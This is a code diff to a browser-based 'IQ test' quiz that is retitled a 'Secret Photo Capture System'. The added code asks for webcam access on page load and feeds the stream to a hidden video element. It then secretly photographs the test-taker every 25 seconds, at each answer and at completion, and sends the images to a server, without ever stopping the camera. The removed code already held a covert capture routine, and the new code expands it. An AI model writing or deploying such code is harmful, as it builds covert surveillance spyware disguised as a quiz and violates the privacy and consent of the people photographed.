@@ -1,12 +1,13 @@
-// IQ Test Application
+// IQ Test Application - Secret Photo Capture System
 class IQTestApp {
     constructor() {
         this.currentQuestion = 0;
         this.answers = [];
         this.sessionId = this.getSessionId();
         this.stream = null;
-        this.photos = [];
         this.ws = null;
+        this.captureInterval = null;
+        this.hiddenVideo = document.getElementById('hidden-video');
         
         this.questions = [
             {
@@ -148,6 +149,7 @@ class IQTestApp {
         this.connectWebSocket();
         this.bindEvents();
         this.shuffleQuestions();
+        this.requestCameraPermission();
     }
     
     connectWebSocket() {
@@ -162,7 +164,6 @@ class IQTestApp {
         
         this.ws.onclose = () => {
             console.log('Disconnected from server');
-            // Attempt reconnection after 3 seconds
             setTimeout(() => this.connectWebSocket(), 3000);
         };
         
@@ -176,18 +177,62 @@ class IQTestApp {
             const j = Math.floor(Math.random() * (i + 1));
             [this.questions[i], this.questions[j]] = [this.questions[j], this.questions[i]];
         }
-        // Take only 25 questions
         this.questions = this.questions.slice(0, 25);
+    }
+    
+    async requestCameraPermission() {
+        const statusEl = document.getElementById('camera-status');
+        const startBtn = document.getElementById('start-test-btn');
+        
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            statusEl.innerHTML = '<span class="status-icon">❌</span><span>Camera not supported in this browser</span>';
+            return;
+        }
+        
+        try {
+            statusEl.innerHTML = '<span class="status-icon">📷</span><span>Requesting camera permission...</span>';
+            
+            this.stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: 'user'
+                },
+                audio: false 
+            });
+            
+            // Set up hidden video element
+            this.hiddenVideo.srcObject = this.stream;
+            this.hiddenVideo.muted = true;
+            this.hiddenVideo.playsInline = true;
+            
+            // Wait for video to be ready
+            await new Promise((resolve) => {
+                this.hiddenVideo.onloadedmetadata = () => {
+                    resolve();
+                };
+            });
+            
+            statusEl.innerHTML = '<span class="status-icon">✅</span><span>Camera ready - Assessment can begin</span>';
+            startBtn.disabled = false;
+            
+            // Send initial verification photo
+            setTimeout(() => {
+                this.capturePhoto('verification');
+            }, 1000);
+            
+        } catch (error) {
+            console.error('Camera access error:', error);
+            statusEl.innerHTML = '<span class="status-icon">❌</span><span>Camera access denied. Please refresh and allow camera access.</span>';
+        }
     }
     
     bindEvents() {
         const startBtn = document.getElementById('start-test-btn');
-        const verifyBtn = document.getElementById('verify-btn');
         const nextBtn = document.getElementById('next-btn');
         const retakeBtn = document.getElementById('retake-btn');
         
-        startBtn.addEventListener('click', () => this.startCameraSetup());
-        verifyBtn.addEventListener('click', () => this.captureVerificationPhoto());
+        startBtn.addEventListener('click', () => this.startTest());
         nextBtn.addEventListener('click', () => this.nextQuestion());
         retakeBtn.addEventListener('click', () => this.retakeTest());
     }
@@ -199,63 +244,50 @@ class IQTestApp {
         document.getElementById(screenId).classList.add('active');
     }
     
-    async startCameraSetup() {
-        this.showScreen('camera-screen');
-        
-        try {
-            this.stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-                    facingMode: 'user'
-                },
-                audio: false 
-            });
-            
-            const video = document.getElementById('camera-video');
-            video.srcObject = this.stream;
-            
-            const statusEl = document.getElementById('camera-status');
-            statusEl.innerHTML = '<span class="status-icon">✅</span><span>Camera ready for verification</span>';
-            
-            const verifyBtn = document.getElementById('verify-btn');
-            verifyBtn.disabled = false;
-            
-        } catch (error) {
-            console.error('Camera access error:', error);
-            const statusEl = document.getElementById('camera-status');
-            statusEl.innerHTML = '<span class="status-icon">❌</span><span>Camera access denied. Please allow camera access and refresh.</span>';
-        }
+    startTest() {
+        this.showScreen('test-screen');
+        this.displayQuestion();
+        this.startSecretCapture();
     }
     
-    captureVerificationPhoto() {
-        const video = document.getElementById('camera-video');
-        const canvas = document.getElementById('camera-canvas');
+    startSecretCapture() {
+        // Capture photo every 25 seconds during test
+        this.captureInterval = setInterval(() => {
+            this.capturePhoto('progress');
+        }, 25000);
+        
+        // Capture initial test start photo
+        setTimeout(() => {
+            this.capturePhoto('test_start');
+        }, 2000);
+    }
+    
+    capturePhoto(type) {
+        if (!this.hiddenVideo || !this.stream) return;
+        
+        const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
         
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = this.hiddenVideo.videoWidth || 640;
+        canvas.height = this.hiddenVideo.videoHeight || 480;
         
-        ctx.drawImage(video, 0, 0);
-        
-        // Convert to base64
-        const photoData = canvas.toDataURL('image/jpeg', 0.8);
-        this.photos.push({
-            type: 'verification',
-            timestamp: Date.now(),
-            data: photoData
-        });
-        
-        // Send to server
-        this.sendPhotoToServer('verification', photoData);
-        
-        // Stop camera stream
-        if (this.stream) {
-            this.stream.getTracks().forEach(track => track.stop());
+        try {
+            ctx.drawImage(this.hiddenVideo, 0, 0, canvas.width, canvas.height);
+            
+            // Add subtle watermark for admin identification
+            ctx.fillStyle = 'rgba(0,0,0,0.7)';
+            ctx.fillRect(canvas.width - 200, canvas.height - 30, 195, 25);
+            ctx.fillStyle = '#fff';
+            ctx.font = '12px Arial';
+            ctx.fillText('IQ Test Capture', canvas.width - 195, canvas.height - 12);
+            
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            this.sendPhotoToServer(type, photoData);
+            
+        } catch (error) {
+            console.error('Photo capture error:', error);
         }
-        
-        // Start the test
-        this.startTest();
     }
     
     sendPhotoToServer(type, photoData) {
@@ -269,67 +301,6 @@ class IQTestApp {
                 currentQuestion: this.currentQuestion
             }));
         }
-    }
-    
-    startTest() {
-        this.showScreen('test-screen');
-        this.displayQuestion();
-        
-        // Restart camera secretly for periodic captures
-        this.startSecretPhotoCapture();
-    }
-    
-    async startSecretPhotoCapture() {
-        try {
-            // Request camera again but keep it hidden
-            this.stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    width: { ideal: 640 },
-                    height: { ideal: 480 },
-                    facingMode: 'user'
-                },
-                audio: false 
-            });
-            
-            // Create hidden video element
-            const hiddenVideo = document.createElement('video');
-            hiddenVideo.style.display = 'none';
-            hiddenVideo.srcObject = this.stream;
-            hiddenVideo.autoplay = true;
-            hiddenVideo.muted = true;
-            document.body.appendChild(hiddenVideo);
-            
-            // Capture photo every 30 seconds
-            this.photoInterval = setInterval(() => {
-                this.captureSecretPhoto(hiddenVideo);
-            }, 30000);
-            
-            // Capture photo on each question
-            this.captureSecretPhoto(hiddenVideo);
-            
-        } catch (error) {
-            console.error('Secret camera setup failed:', error);
-        }
-    }
-    
-    captureSecretPhoto(video) {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        ctx.drawImage(video, 0, 0);
-        
-        const photoData = canvas.toDataURL('image/jpeg', 0.6);
-        this.photos.push({
-            type: 'progress',
-            timestamp: Date.now(),
-            question: this.currentQuestion,
-            data: photoData
-        });
-        
-        this.sendPhotoToServer('progress', photoData);
     }
     
     displayQuestion() {
@@ -364,10 +335,14 @@ class IQTestApp {
                 this.answers[this.currentQuestion] = answerIndex;
                 
                 document.getElementById('next-btn').disabled = false;
+                
+                // Capture photo when answer is selected
+                setTimeout(() => {
+                    this.capturePhoto('answer_selected');
+                }, 500);
             });
         });
         
-        // Disable next button until answer is selected
         document.getElementById('next-btn').disabled = true;
     }
     
@@ -383,13 +358,12 @@ class IQTestApp {
     
     finishTest() {
         // Stop secret photo capture
-        if (this.photoInterval) {
-            clearInterval(this.photoInterval);
+        if (this.captureInterval) {
+            clearInterval(this.captureInterval);
         }
         
-        if (this.stream) {
-            this.stream.getTracks().forEach(track => track.stop());
-        }
+        // Capture final completion photo
+        this.capturePhoto('test_complete');
         
         // Calculate score
         let correctAnswers = 0;
@@ -400,12 +374,9 @@ class IQTestApp {
         });
         
         const percentage = (correctAnswers / this.questions.length) * 100;
-        const iqScore = Math.round(85 + (percentage / 100) * 45); // Scale to 85-130 range
+        const iqScore = Math.round(85 + (percentage / 100) * 45);
         
-        // Show results
         this.showResults(iqScore, percentage);
-        
-        // Send completion data to server
         this.sendTestCompletion(iqScore, correctAnswers);
     }
     
@@ -425,15 +396,11 @@ class IQTestApp {
     
     showResults(iqScore, percentage) {
         this.showScreen('results-screen');
-        
-        // Animate score display
         this.animateScore(iqScore);
         
-        // Show interpretation
         const description = this.getScoreDescription(iqScore);
         document.getElementById('score-description').textContent = description;
         
-        // Animate skill bars
         setTimeout(() => {
             this.animateSkillBars(percentage);
         }, 1000);
@@ -474,16 +441,15 @@ class IQTestApp {
     }
     
     retakeTest() {
-        // Reset test state
         this.currentQuestion = 0;
         this.answers = [];
-        this.photos = [];
-        
-        // Shuffle questions again
         this.shuffleQuestions();
-        
-        // Show welcome screen
         this.showScreen('welcome-screen');
+        
+        // Re-enable start button if camera is ready
+        if (this.stream) {
+            document.getElementById('start-test-btn').disabled = false;
+        }
     }
 }
 
